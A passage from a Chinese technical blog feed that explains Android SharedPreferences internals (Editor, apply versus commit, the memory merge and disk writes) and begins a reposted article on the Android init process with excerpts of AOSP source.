处，如果已经加载过，则不再进行加载，之后又开始判断是否存在备份文件，若存在则直接将备份文件直接修改为数据文件 ${name}.xml。</p><p>之后在注释 2 处，通过 XmlUtils 将 xml 中的数据读取为一个 Map。由于本文主要是对 SP 的大致流程的解读，因此关于 XML 文件的具体读取部分，有兴趣的读者可以自己进入源码研究。</p><p>之后在注释 3 处，进行了一些收尾处理，将 mLoaded 置为 true，并对 mMap 进行了判空处理，以保证在 xml 没有数据的情况下其仍不为 null，最后释放了这个读取的锁，表示读取成功。</p><h1 id="编辑-SharedPreferences"><a href="#编辑-SharedPreferences" class="headerlink" title="编辑 SharedPreferences"></a>编辑 SharedPreferences</h1><p>我们都知道，真正对 SP 的操作其实都是在 Editor 中的，它其实是一个接口，具体的实现类为 EditorImpl。让我们先看看 Editor 的获取：</p><p>获取 Editor<br>看到 SharedPreferencesImpl 的 edit 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public Editor edit() &#123;</span><br><span class="line">    &#x2F;&#x2F; TODO: remove the need to call awaitLoadedLocked() when</span><br><span class="line">    &#x2F;&#x2F; requesting an editor.  will require some work on the</span><br><span class="line">    &#x2F;&#x2F; Editor, but then we should be able to do:</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F;      context.getSharedPreferences(..).edit().putString(..).apply()</span><br><span class="line">    &#x2F;&#x2F;</span><br><span class="line">    &#x2F;&#x2F; ... all without blocking.</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        awaitLoadedLocked();</span><br><span class="line">    &#125;</span><br><span class="line">    return new EditorImpl();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里首先先调用了 awaitLoadedLocked() 方法来等待读取的完成，当读取完成后才会真正创建并返回 EditorImpl 对象。</p><h1 id="等待读取机制"><a href="#等待读取机制" class="headerlink" title="等待读取机制"></a>等待读取机制</h1><p>由于读取过程是一个异步的过程，很有可能导致读取还没结束，我们就开始编辑，因此这里用到了一个 awaitLoadedLocked 方法来阻塞线程，直到读取过程完成，下面我们可以先看看 awaitLoadedLocked 方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">private void awaitLoadedLocked() &#123;</span><br><span class="line">    if (!mLoaded) &#123;</span><br><span class="line">        &#x2F;&#x2F; Raise an explicit StrictMode onReadFromDisk for th</span><br><span class="line">        &#x2F;&#x2F; thread, since the real read will be in a different</span><br><span class="line">        &#x2F;&#x2F; thread and otherwise ignored by StrictMode.</span><br><span class="line">        BlockGuard.getThreadPolicy().onReadFromDisk();</span><br><span class="line">    &#125;</span><br><span class="line">    while (!mLoaded) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            mLock.wait();</span><br><span class="line">        &#125; catch (InterruptedException unused) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，这里会阻塞直到 mLoaded 为 true，这样就保证了该方法后的方法都会在读取操作进行后执行。</p><h1 id="EditorImpl"><a href="#EditorImpl" class="headerlink" title="EditorImpl"></a>EditorImpl</h1><p>前面我们提到了 Edit 的真正实现类是 EditorImpl，它其实是 SPI 的一个内部类。它内部维护了一个Map&lt;String, Object&gt;： mModified，通过 mModified 来存放对 SP 进行的操作，此时还不会提交到 SPI 中的 mMap，我们做的操作都是在改变 mModified。</p><p>下面列出一些 EditorImpl 对外提供的修改接口，其实都是在对 mModified 这个 Map 进行修改，具体代码就不再讲解，比较简单：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">public Editor putString(String key, @Nullable String val</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, value);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor putStringSet(String key, @Nullable Set&lt;Str</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key,</span><br><span class="line">                (values &#x3D;&#x3D; null) ? null : new HashSet&lt;St</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor putInt(String key, int value) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, value);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor putLong(String key, long value) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, value);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor putFloat(String key, float value) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, value);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor putBoolean(String key, boolean value) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, value);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor remove(String key) &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mModified.put(key, this);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public Editor clear() &#123;</span><br><span class="line">    synchronized (mLock) &#123;</span><br><span class="line">        mClear &#x3D; true;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="提交-SharedPreferences"><a href="#提交-SharedPreferences" class="headerlink" title="提交 SharedPreferences"></a>提交 SharedPreferences</h1><p>提交本来可以放到编辑中的，但因为它才是重头戏，因此我们单独拎出来讲一下。</p><p>我们都知道 SP 的提交有两种方式——apply 和 commit。下面我们来分别分析：</p><h1 id="apply"><a href="#apply" class="headerlink" title="apply"></a>apply</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public void apply() &#123;</span><br><span class="line">    final long startTime &#x3D; System.currentTimeMillis();</span><br><span class="line">    final MemoryCommitResult mcr &#x3D; commitToMemory();    &#x2F;&#x2F; 1</span><br><span class="line">    final Runnable awaitCommit &#x3D; new Runnable() &#123;</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    mcr.writtenToDiskLatch.await();</span><br><span class="line">                &#125; catch (InterruptedException ignored) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                if (DEBUG &amp;&amp; mcr.wasWritten) &#123;</span><br><span class="line">                    Log.d(TAG, mFile.getName() + &quot;:&quot; + mcr.memoryStateGeneration</span><br><span class="line">                            + &quot; applied after &quot; + (System.currentTimeMillis() - startTime)</span><br><span class="line">                            + &quot; ms&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    QueuedWork.addFinisher(awaitCommit);</span><br><span class="line">    Runnable postWriteRunnable &#x3D; new Runnable() &#123;</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                awaitCommit.run();</span><br><span class="line">                QueuedWork.removeFinisher(awaitCommit);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    SharedPreferencesImpl.this.enqueueDiskWrite(mcr, postWriteRunnable);    &#x2F;&#x2F; 2</span><br><span class="line">    &#x2F;&#x2F; Okay to notify the listeners before it&#39;s hit disk</span><br><span class="line">    &#x2F;&#x2F; because the listeners should always get the same</span><br><span class="line">    &#x2F;&#x2F; SharedPreferences instance back, which has the</span><br><span class="line">    &#x2F;&#x2F; changes reflected in memory.</span><br><span class="line">    notifyListeners(mcr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先看到注释 1 处，调用了 commitToMemory 方法，它内部就是<strong>将原先读取进来的 mMap 与刚刚修改过的 mModified 进行合并，并存储于返回的 MemoryCommitResult mcr中。</strong></p><p>而在注释 2 处，调用了 enqueueDiskWrite 方法，传入了之前构造的 Runnable 对象，这里的目的是进行一个异步的写操作。</p><p>前面提到的两个方法，我们放到后面分析。</p><p>也就是说，<strong>apply 方法会将数据先提交到内存，再开启一个异步过程来将数据写入硬盘。</strong></p><h1 id="commit"><a href="#commit" class="headerlink" title="commit"></a>commit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public boolean commit() &#123;</span><br><span class="line">    long startTime &#x3D; 0;</span><br><span class="line">    if (DEBUG) &#123;</span><br><span class="line">        startTime &#x3D; System.currentTimeMillis();</span><br><span class="line">    &#125;</span><br><span class="line">    MemoryCommitResult mcr &#x3D; commitToMemory();  &#x2F;&#x2F; 1</span><br><span class="line">    SharedPreferencesImpl.this.enqueueDiskWrite(    &#x2F;&#x2F; 2</span><br><span class="line">        mcr, null &#x2F;* sync write on this thread okay *&#x2F;);    </span><br><span class="line">    try &#123;</span><br><span class="line">        mcr.writtenToDiskLatch.await();</span><br><span class="line">    &#125; catch (InterruptedException e) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125; finally &#123;</span><br><span class="line">        if (DEBUG) &#123;</span><br><span class="line">            Log.d(TAG, mFile.getName() + &quot;:&quot; + mcr.memoryStateGeneration</span><br><span class="line">                    + &quot; committed after &quot; + (System.currentTimeMillis() - startTime)</span><br><span class="line">                    + &quot; ms&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    notifyListeners(mcr);</span><br><span class="line">    return mcr.writeToDiskResult;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到注释 1 处，可以发现，同样调用了 commitToMemory 方法进行了合并。</p><p>之后看到 2 处，同样调用了 enqueueDiskWrite 方法，不过传入的第二个不再是 Runnable 方法。这里提一下，如果 enqueueDiskWrite 方法传入的第二个参数为 null，则会在当前线程执行写入操作。</p><p>也就是说，<strong>commit 方法会将数据先提交到内存，但之后则是一个同步的过程写入硬盘。</strong></p><h1 id="同步数据至内存"><a href="#同步数据至内存" class="headerlink" title="同步数据至内存"></a>同步数据至内存</h1><p>下面我们来看看两个方法中都调用了的 commitToMemory 的具体实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">private MemoryCommitResult commitToMemory() &#123;</span><br><span class="line">        ...</span><br><span class="line">        synchronized (mLock) &#123;</span><br><span class="line">            boolean changesMade &#x3D; false;</span><br><span class="line">            if (mClear) &#123;</span><br><span class="line">                if (!mMap.isEmpty()) &#123;</span><br><span class="line">                    changesMade &#x3D; true;</span><br><span class="line">                    mMap.clear();</span><br><span class="line">                &#125;</span><br><span class="line">                mClear &#x3D; false;</span><br><span class="line">            &#125;</span><br><span class="line">            for (Map.Entry&lt;String, Object&gt; e : mModified.entrySet()) &#123;</span><br><span class="line">                String k &#x3D; e.getKey();</span><br><span class="line">                Object v &#x3D; e.getValue();</span><br><span class="line">                if (v &#x3D;&#x3D; this || v &#x3D;&#x3D; null) &#123;</span><br><span class="line">                    if (!mMap.containsKey(k)) &#123;</span><br><span class="line">                        continue;</span><br><span class="line">                    &#125;</span><br><span class="line">                    mMap.remove(k);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    if (mMap.containsKey(k)) &#123;</span><br><span class="line">                        Object existingValue &#x3D; mMap.get(k);</span><br><span class="line">                        if (existingValue !&#x3D; null &amp;&amp; existingValue.equals(v)) &#123;</span><br><span class="line">                            continue;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    mMap.put(k, v);</span><br><span class="line">                &#125;</span><br><span class="line">                changesMade &#x3D; true;</span><br><span class="line">                if (hasListeners) &#123;</span><br><span class="line">                    keysModified.add(k);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            mModified.clear();</span><br><span class="line">            if (changesMade) &#123;</span><br><span class="line">                mCurrentMemoryStateGeneration++;</span><br><span class="line">            &#125;</span><br><span class="line">            memoryStateGeneration &#x3D; mCurrentMemoryStateGeneration;</span><br><span class="line">        &#125;</span><br><span class="line">    return new MemoryCommitResult(memoryStateGeneration, keysModified, listeners,</span><br><span class="line">            mapToWriteToDisk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，具体的代码就如同我们之前所说的一样，将 mMap 的数据与 mModified 的数据进行了整合，之后将 mModified 重新清空。最后将合并的数据放入了 MemoryCommitResult 中。</p><h1 id="写入数据至硬盘"><a href="#写入数据至硬盘" class="headerlink" title="写入数据至硬盘"></a>写入数据至硬盘</h1><p>我们同样看到 apply 和 commit 都调用了的方法 enqueueDiskWrite：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private void enqueueDiskWrite(final MemoryCommitResult mcr,</span><br><span class="line">                              final Runnable postWriteRunnable) &#123;</span><br><span class="line">    final boolean isFromSyncCommit &#x3D; (postWriteRunnable &#x3D;&#x3D; null);   &#x2F;&#x2F; 1</span><br><span class="line">    final Runnable writeToDiskRunnable &#x3D; new Runnable() &#123;</span><br><span class="line">            public void run() &#123;</span><br><span class="line">                synchronized (mWritingToDiskLock) &#123;</span><br><span class="line">                    writeToFile(mcr, isFromSyncCommit);</span><br><span class="line">                &#125;</span><br><span class="line">                synchronized (mLock) &#123;</span><br><span class="line">                    mDiskWritesInFlight--;</span><br><span class="line">                &#125;</span><br><span class="line">                if (postWriteRunnable !&#x3D; null) &#123;</span><br><span class="line">                    postWriteRunnable.run();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#x2F;&#x2F; Typical #commit() path with fewer allocations, doing a write on</span><br><span class="line">    &#x2F;&#x2F; the current thread.</span><br><span class="line">    if (isFromSyncCommit) &#123;</span><br><span class="line">        boolean wasEmpty &#x3D; false;</span><br><span class="line">        synchronized (mLock) &#123;</span><br><span class="line">            wasEmpty &#x3D; mDiskWritesInFlight &#x3D;&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if (wasEmpty) &#123;</span><br><span class="line">            writeToDiskRunnable.run();  &#x2F;&#x2F; 2 </span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    QueuedWork.queue(writeToDiskRunnable, !isFromSyncCommit);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到 1 处，若第二个 Runnable 为 null 的话，则会将 isFromSyncCommit 置为 true，也就是写入会是一个同步的过程。之后在注释 2 处便进行了同步写入。否则会构造一个 Runnable 来提供给 QueueWork 进行异步写入。</p><p>QueueWork 类内部维护了一个 single 线程池，这样可以达到我们异步写入的目的。</p><p>而 writeToFile 方法中其实就是又调用了之前的 XmlUtils 来进行 XML 的写入。</p><p>#总结<br>SharedPreferences 其实就是一个用使用 XML 进行保存的 K-V 存储库。</p><p>在获取 SP 时会进行数据的加载，将 name 对应的 xml 文件以 Map 的形式读入到内存。</p><p>而 SP 的编辑操作其实都是在 Editor 内实现，它内部维护了一个新的 Map，所有的编辑操作其实都是在操作这个 Map，只有提交时才会与之前读取的数据进行合并。</p><p>其提交分为两种，apply 和 commit，它们的特性如下</p><ul><li><p>apply</p><ul><li>会将数据先提交到内存，再开启一个异步过程来将数据写入硬盘。</li><li>返回值时可能写入操作还没有结束<ul><li>写入失败时不会有任何提示</li></ul></li></ul></li><li><p>commit</p><ul><li>会将数据先提交到内存，但之后则是一个同步的过程写入硬盘。</li><li>写入操作结束后才会返回值=</li><li>写入失败会有提示</li></ul></li></ul><p>因此，当我们对写入的结果不那么关心的情况下，可以使用 apply 进行异步写入，而当我们对写入结果十分关心且提交后有后续操作的话最好使用 commit 来进行同步写入。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android系统启动流程（一）解析init进程启动过程</title>
      <link href="/2021/09/21/Android%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E8%A7%A3%E6%9E%90init%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2021/09/21/Android%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E8%A7%A3%E6%9E%90init%E8%BF%9B%E7%A8%8B%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="http://liuwangshu.cn/framework/booting/1-init.html">Android系统启动流程（一）解析init进程启动过程</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>作为“Android框架层”这个大系列中的第一个系列，我们首先要了解的是Android系统启动流程，在这个流程中会涉及到很多重要的知识点，这个系列我们就来一一讲解它们，这一篇我们就来学习init进程。</p><h1 id="1-init简介"><a href="#1-init简介" class="headerlink" title="1.init简介"></a>1.init简介</h1><p>init进程是Android系统中用户空间的第一个进程，作为第一个进程，它被赋予了很多极其重要的工作职责，比如创建zygote(孵化器)和属性服务等。init进程是由多个源文件共同组成的，这些文件位于源码目录system/core/init。本文将基于Android7.0源码来分析Init进程。</p><h1 id="2-引入init进程"><a href="#2-引入init进程" class="headerlink" title="2.引入init进程"></a>2.引入init进程</h1><p>说到init进程，首先要提到Android系统启动流程的前几步：</p><ol><li>启动电源以及系统启动<br>当电源按下时引导芯片代码开始从预定义的地方（固化在ROM）开始执行。加载引导程序Bootloader到RAM，然后执行。</li><li>引导程序Bootloader<br>引导程序是在Android操作系统开始运行前的一个小程序，它的主要作用是把系统OS拉起来并运行。</li><li>linux内核启动<br>内核启动时，设置缓存、被保护存储器、计划列表，加载驱动。当内核完成系统设置，它首先在系统文件中寻找”init”文件，然后启动root进程或者系统的第一个进程。</li><li>init进程启动</li></ol><p>讲到第四步就发现我们这一节要讲的init进程了。关于Android系统启动流程的所有步骤会在本系列的最后一篇做讲解。</p><h1 id="3-init入口函数"><a href="#3-init入口函数" class="headerlink" title="3.init入口函数"></a>3.init入口函数</h1><p>init的入口函数为main，代码如下所示。<br><strong>system/core/init/init.cpp</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    if (!strcmp(basename(argv[0]), &quot;ueventd&quot;)) &#123;</span><br><span class="line">        return ueventd_main(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">    if (!strcmp(basename(argv[0]), &quot;watchdogd&quot;)) &#123;</span><br><span class="line">        return watchdogd_main(argc, argv);</span><br><span class="line">    &#125;</span><br><span class="line">    umask(0);</span><br><span class="line">    add_environment(&quot;PATH&quot;, _PATH_DEFPATH);</span><br><span class="line">    bool is_first_stage &#x3D; (argc &#x3D;&#x3D; 1) || (strcmp(argv[1], &quot;--second-stage&quot;) !&#x3D; 0);</span><br><span class="line">    &#x2F;&#x2F;创建文件并挂载</span><br><span class="line">    if (is_first_stage) &#123;</span><br><span class="line">        mount(&quot;tmpfs&quot;, &quot;&#x2F;dev&quot;, &quot;tmpfs&quot;, MS_NOSUID, &quot;mode&#x3D;0755&quot;);</span><br><span class="line">        mkdir(&quot;&#x2F;dev&#x2F;pts&quot;, 0755);</span><br><span class="line">        mkdir(&quot;&#x2F;dev&#x2F;socket&quot;, 0755);</span><br><span class="line">        mount(&quot;devpts&quot;, &quot;&#x2F;dev&#x2F;pts&quot;, &quot;devpts&quot;, 0, NULL);</span><br><span class="line">        #define MAKE_STR(x) __STRING(x)</span><br><span class="line">        mount(&quot;proc&quot;, &quot;&#x2F;proc&quot;, &quot;proc&quot;, 0, &quot;hidepid&#x3D;2,gid&#x3D;&quot; MAKE_STR(AID_READPROC));</span><br><span class="line">        mount(&quot;sysfs&quot;, &quot;&#x2F;sys&quot;, &quot;sysfs&quot;, 0, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">    open_devnull_stdio();</span><br><span class="line">    klog_init();</span><br><span class="line">    klog_set_level(KLOG_NOTICE_LEVEL);</span><br><span class="line">    NOTICE(&quot;init %s started!\n&quot;, is_first_stage ? &quot;first stage&quot; : &quot;second stage&quot;);</span><br><span class="line">    if (!is_first_stage) &#123;</span><br><span class="line">        &#x2F;&#x2F; Indicate that booting is in progress to background fw loaders, etc.</span><br><span class="line">        close(open(&quot;&#x2F;dev&#x2F;.booting&quot;, O_WRONLY | O_CREAT | O_CLOEXEC, 0000));</span><br><span class="line">        &#x2F;&#x2F;初始化属性相关资源</span><br><span class="line">        property_init();&#x2F;&#x2F;1</span><br><span class="line">        process_kernel_dt();</span><br><span class="line">        process_kernel_cmdline();</span><br><span class="line">        export_kernel_boot_props();</span><br><span class="line">    &#125;</span><br><span class="line"> ...</span><br><span class="line">    &#x2F;&#x2F;启动属性服务</span><br><span class="line">    start_property_service();&#x2F;&#x2F;2</span><br><span class="line">    const BuiltinFunctionMap function_map;</span><br><span class="line">    Action::set_function_map(&amp;function_map);</span><br><span class="line">    Parser&amp; parser &#x3D; Parser::GetInstance();</span><br><span class="line">    parser.AddSectionParser(&quot;service&quot;,std::make_unique&lt;ServiceParser&gt;());</span><br><span class="line">    parser.AddSectionParser(&quot;on&quot;, std::make_unique&lt;ActionParser&gt;());</span><br><span class="line">    parser.AddSectionParser(&quot;import&quot;, std::make_unique&lt;ImportParser&gt;());</span><br><span class="line">    &#x2F;&#x2F;解析init.rc配置文件</span><br><span class="line">    parser.ParseConfig(&quot;&#x2F;init.rc&quot;);&#x2F;&#x2F;3</span><br><span class="line">   ...   </span><br><span class="line">       while (true) &#123;</span><br><span class="line">        if (!waiting_for_exec) &#123;</span><br><span class="line">            am.ExecuteOneCommand();</span><br><span class="line">            restart_processes();</span><br><span class="line">        &#125;</span><br><span class="line">        int timeout &#x3D; -1;</span><br><span class="line">        if (process_needs_restart) &#123;</span><br><span class="line">            timeout &#x3D; (process_needs_restart - gettime()) * 1000;</span><br><span class="line">            if (timeout &lt; 0)</span><br><span class="line">                timeout &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        if (am.HasMoreCommands()) &#123;</span><br><span class="line">            timeout &#x3D; 0;</span><br><span class="line">        &#125;</span><br><span class="line">        bootchart_sample(&amp;timeout);</span><br><span class="line">        epoll_event ev;</span><br><span class="line">        int nr &#x3D; TEMP_FAILURE_RETRY(epoll_wait(epoll_fd, &amp;ev, 1, timeout));</span><br><span class="line">        if (nr &#x3D;&#x3D; -1) &#123;</span><br><span class="line">            ERROR(&quot;epoll_wait failed: %s\n&quot;, strerror(errno));</span><br><span class="line">        &#125; else if (nr &#x3D;&#x3D; 1) &#123;</span><br><span class="line">            ((void (*)()) ev.data.ptr)();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>init的main方法做了很多事情，我们只需要关注主要的几点，在注释1处调用 property_init来对属性进行初始化并在注释2处的 调用start_property_service启动属性服务，关于属性服务，后面会讲到。注释3处 parser.ParseConfig(“/init.rc”)用来解析init.rc。解析init.rc的文件为system/core/init/init_parse.cpp文件，接下来我们查看init.rc里做了什么。</p><h1 id="4-init-rc"><a href="#4-init-rc" class="headerlink" title="4.init.rc"></a>4.init.rc</h1><p>init.rc是一个配置文件，内部由Android初始化语言编写（Android Init Language）编写的脚本，它主要包含五种类型语句：<br>Action、Commands、Services、Options和Import。init.rc的配置代码如下所示。<br><strong>system/core/rootdir/init.rc</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 